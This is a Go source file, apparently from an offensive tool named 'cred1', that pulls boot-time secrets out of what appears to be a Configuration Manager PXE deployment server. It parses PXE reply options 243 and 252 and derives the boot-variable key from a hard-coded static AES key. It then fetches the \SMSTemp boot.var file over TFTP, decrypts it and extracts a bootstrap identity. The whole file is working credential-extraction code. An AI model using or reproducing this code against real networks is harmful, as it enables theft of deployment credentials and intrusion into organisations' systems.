package cred1

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"net/netip"
	"strings"
	"time"
)

const (
	maxPXEPathBytes = 256
	maxTFTPBlocks   = 512
	maxTFTPBytes    = MaxBootVarBytes
	tftpBlockSize   = 512
	tftpRetries     = 2
)

// PXEBootstrap holds transient bootstrap data extracted from one matching PXE
// reply. BootVarKey must be used immediately and never persisted.
type PXEBootstrap struct {
	BootVarPath string
	BootBCDPath string
	bootVarKey  []byte
}

func parsePXEBootstrap(reply PXEReply) (PXEBootstrap, error) {
	var out PXEBootstrap
	if len(reply.Payload) < bootpHeaderBytes+dhcpCookieBytes {
		return out, errors.New("PXE reply lacks DHCP options")
	}
	options := reply.Payload[bootpHeaderBytes+dhcpCookieBytes:]
	var opt243, opt252 []byte
	for i, count := 0, 0; i < len(options) && count < 64; count++ {
		code := options[i]
		i++
		if code == 0 {
			continue
		}
		if code == 255 {
			break
		}
		if i >= len(options) {
			return out, errors.New("truncated DHCP option")
		}
		n := int(options[i])
		i++
		if n > len(options)-i {
			return out, errors.New("truncated DHCP option value")
		}
		value := options[i : i+n]
		i += n
		switch code {
		case 243:
			if opt243 != nil {
				return out, errors.New("duplicate PXE option 243")
			}
			opt243 = value
		case 252:
			if opt252 != nil {
				return out, errors.New("duplicate PXE option 252")
			}
			opt252 = value
		}
	}
	if opt243 == nil || opt252 == nil {
		return out, errors.New("PXE reply lacks required bootstrap options")
	}
	path, key, err := parseOption243(opt243)
	if err != nil {
		return out, err
	}
	bcd, err := validateSMSTempPath(string(trimNUL(opt252)), ".boot.bcd")
	if err != nil {
		return out, fmt.Errorf("PXE option 252: %w", err)
	}
	out.BootVarPath, out.BootBCDPath, out.bootVarKey = path, bcd, key
	return out, nil
}

func parseOption243(value []byte) (string, []byte, error) {
	if len(value) < 4 || value[0] != 2 {
		return "", nil, errors.New("unsupported PXE option 243 envelope")
	}
	n := int(value[1])
	if n < 48 || 2+n+2 > len(value) {
		return "", nil, errors.New("invalid PXE option 243 envelope length")
	}
	pathLengthIndex := 2 + n + 1
	pathStart := pathLengthIndex + 1
	pathLength := int(value[pathLengthIndex])
	if pathLength == 0 || pathLength > maxPXEPathBytes || pathStart+pathLength > len(value) {
		return "", nil, errors.New("invalid PXE option 243 path")
	}
	path, err := validateSMSTempPath(string(value[pathStart:pathStart+pathLength]), ".boot.var")
	if err != nil {
		return "", nil, fmt.Errorf("PXE option 243: %w", err)
	}
	key, err := deriveBootVarKey(value[2 : 2+n])
	if err != nil {
		return "", nil, err
	}
	return path, key, nil
}

func validateSMSTempPath(path, suffix string) (string, error) {
	if len(path) == 0 || len(path) > maxPXEPathBytes || strings.IndexByte(path, 0) >= 0 ||
		!strings.HasPrefix(path, `\SMSTemp\`) || !strings.HasSuffix(strings.ToLower(path), suffix) {
		return "", errors.New("unexpected SMSTemp path")
	}
	rest := strings.TrimPrefix(path, `\SMSTemp\`)
	if rest == "" || strings.Contains(rest, `\`) || strings.Contains(rest, "/") || strings.Contains(rest, "..") || strings.HasPrefix(rest, `\\`) {
		return "", errors.New("unsafe SMSTemp path")
	}
	return path, nil
}

func trimNUL(b []byte) []byte { return []byte(strings.TrimRight(string(b), "\x00")) }

func deriveBootVarKey(envelope []byte) ([]byte, error) {
	if len(envelope) < 49 {
		return nil, errors.New("invalid PXE encrypted key envelope")
	}
	n := int(envelope[0])
	if n < 48 || n+1 > len(envelope) {
		return nil, errors.New("invalid PXE encrypted key length")
	}
	enc := envelope[1 : 1+n]
	if len(enc) < 32 {
		return nil, errors.New("invalid PXE encrypted key material")
	}
	ciphertext := enc[20 : len(enc)-12]
	if len(ciphertext) != aes.BlockSize {
		return nil, errors.New("unexpected PXE encrypted key size")
	}
	static := []byte{0x9f, 0x67, 0x9c, 0x9b, 0x37, 0x3a, 0x1f, 0x48, 0x82, 0x4f, 0x37, 0x87, 0x33, 0xde, 0x24, 0xe9}
	b, _ := aes.NewCipher(MediaKey(static)[:aes.BlockSize])
	plain := make([]byte, aes.BlockSize)
	cipher.NewCBCDecrypter(b, make([]byte, aes.BlockSize)).CryptBlocks(plain, ciphertext)
	expanded := make([]byte, 0, 20)
	for _, x := range plain[:10] {
		expanded = append(expanded, x)
		if x&0x80 != 0 {
			expanded = append(expanded, 0xff)
		} else {
			expanded = append(expanded, 0)
		}
	}
	return MediaKey(expanded), nil
}

func fetchBootVar(ctx context.Context, dp netip.Addr, path string) ([]byte, error) {
	if !dp.Is4() {
		return nil, errors.New("invalid TFTP DP")
	}
	if _, err := validateSMSTempPath(path, ".boot.var"); err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp4", nil)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	rrq := append([]byte{0, 1}, []byte(path)...)
	rrq = append(rrq, 0)
	rrq = append(rrq, "octet"...)
	rrq = append(rrq, 0)
	server := &net.UDPAddr{IP: dp.AsSlice(), Port: 69}
	if _, err = conn.WriteToUDP(rrq, server); err != nil {
		return nil, err
	}
	buf, out := make([]byte, 4+tftpBlockSize), make([]byte, 0, 16<<10)
	var peer *net.UDPAddr
	for block := uint16(1); int(block) <= maxTFTPBlocks; block++ {
		var n int
		for attempt := 0; attempt <= tftpRetries; attempt++ {
			if err := conn.SetReadDeadline(time.Now().Add(2 * time.Second)); err != nil {
				return nil, err
			}
			n, peer, err = conn.ReadFromUDP(buf)
			if err == nil {
				break
			}
			if ctx.Err() != nil {
				return nil, ctx.Err()
			}
			if attempt == tftpRetries {
				return nil, errors.New("TFTP boot.var timeout")
			}
			_, _ = conn.WriteToUDP(rrq, server)
		}
		if peer == nil || !peer.IP.Equal(dp.AsSlice()) || n < 4 || binary.BigEndian.Uint16(buf[:2]) != 3 || binary.BigEndian.Uint16(buf[2:4]) != block {
			return nil, errors.New("invalid TFTP boot.var response")
		}
		data := buf[4:n]
		if len(out)+len(data) > maxTFTPBytes {
			return nil, errors.New("TFTP boot.var exceeds bound")
		}
		out = append(out, data...)
		ack := []byte{0, 4, byte(block >> 8), byte(block)}
		if _, err := conn.WriteToUDP(ack, peer); err != nil {
			return nil, err
		}
		if len(data) < tftpBlockSize {
			return out, nil
		}
	}
	return nil, errors.New("TFTP boot.var block limit exceeded")
}

// AcquireBootstrap performs the bounded PXE reply, exact option handling, one
// server-returned TFTP boot.var transfer, and strict identity extraction.
func AcquireBootstrap(ctx context.Context, iface string, dp netip.Addr) (BootstrapIdentity, error) {
	reply, err := AcquirePXEReply(ctx, iface, dp, 10*time.Second)
	if err != nil {
		return BootstrapIdentity{}, err
	}
	b, err := parsePXEBootstrap(reply)
	if err != nil {
		return BootstrapIdentity{}, err
	}
	raw, err := fetchBootVar(ctx, dp, b.BootVarPath)
	if err != nil {
		return BootstrapIdentity{}, err
	}
	plain, err := DecryptBootVar(raw, b.bootVarKey)
	if err != nil {
		return BootstrapIdentity{}, err
	}
	return ParseBootVar(plain)
}
